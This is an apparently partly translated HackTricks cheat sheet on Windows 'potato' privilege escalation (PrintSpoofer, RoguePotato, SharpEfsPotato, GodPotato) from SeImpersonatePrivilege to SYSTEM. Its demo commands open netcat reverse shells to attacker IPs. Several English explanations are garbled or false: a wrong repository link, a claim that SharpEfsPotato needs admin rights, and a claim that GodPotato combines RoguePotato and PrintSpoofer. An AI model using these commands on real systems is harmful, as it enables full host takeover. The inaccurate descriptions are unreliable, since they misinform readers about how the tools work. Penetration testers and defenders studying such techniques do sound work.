# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

{% hint style="warning" %}
**JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 in poi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) possono essere utilizzati per **sfruttare gli stessi privilegi e ottenere accesso di livello `NT AUTHORITY\SYSTEM`**. Questo [post del blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) approfondisce lo strumento `PrintSpoofer`, che può essere utilizzato per abusare dei privilegi di impersonificazione su host Windows 10 e Server 2019 dove JuicyPotato non funziona più.
{% endhint %}

## Demo Veloce

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
### RoguePotato

{% code overflow="wrap" %}
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato is a tool that exploits the EFS (Encrypting File System) service to achieve local privilege escalation on Windows systems. This technique can be used to gain SYSTEM-level privileges.

#### Usage

To use SharpEfsPotato, follow these steps:

1. Download the tool from the [GitHub repository](https://github.com/itm4n/SharpEfsPotato).
2. Compile the source code using Visual Studio or use the precompiled binary.
3. Execute the tool with the following command:

```plaintext
SharpEfsPotato.exe
```

#### How it Works

SharpEfsPotato takes advantage of the EFS service, which runs as a privileged Local System account. It creates a rogue EFS certificate and a rogue EFS file, which triggers the EFS service to execute a custom command as SYSTEM.

#### Limitations

- This technique requires administrative privileges to execute.
- It only works on Windows systems that have the EFS service enabled.
- The EFS service must be running as the Local System account.

#### Mitigation

To mitigate the risk of SharpEfsPotato and similar attacks, consider the following measures:

- Disable the EFS service if it is not required.
- Regularly update and patch your Windows systems to prevent known vulnerabilities.
- Implement strong access controls and permissions to limit the impact of privilege escalation attacks.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato is a technique that combines the RoguePotato and PrintSpoofer exploits to achieve local privilege escalation on Windows systems. 

RoguePotato is an exploit that takes advantage of the Windows COM Server to execute arbitrary code with SYSTEM privileges. It works by creating a malicious COM object that triggers the execution of a specified command. This can be used to escalate privileges from a low-privileged user to SYSTEM.

PrintSpoofer, on the other hand, is a tool that abuses the Windows Print Spooler service to execute arbitrary code with SYSTEM privileges. It takes advantage of the impersonation capabilities of the Print Spooler service to bypass security restrictions and gain elevated privileges.

By combining these two exploits, GodPotato allows an attacker to escalate their privileges from a low-privileged user to SYSTEM. This can be particularly useful in scenarios where the attacker has limited access to the target system but wants to gain full control.

To use GodPotato, the attacker needs to have local access to the target system and be able to execute arbitrary code. The steps to perform the attack involve creating a malicious COM object using RoguePotato and then using PrintSpoofer to trigger the execution of the malicious code.

It's important to note that GodPotato is a powerful technique that can lead to full compromise of the target system. Therefore, it's crucial to apply proper security measures, such as keeping systems up to date with the latest patches and using strong access controls, to mitigate the risk of such attacks.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## Riferimenti
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
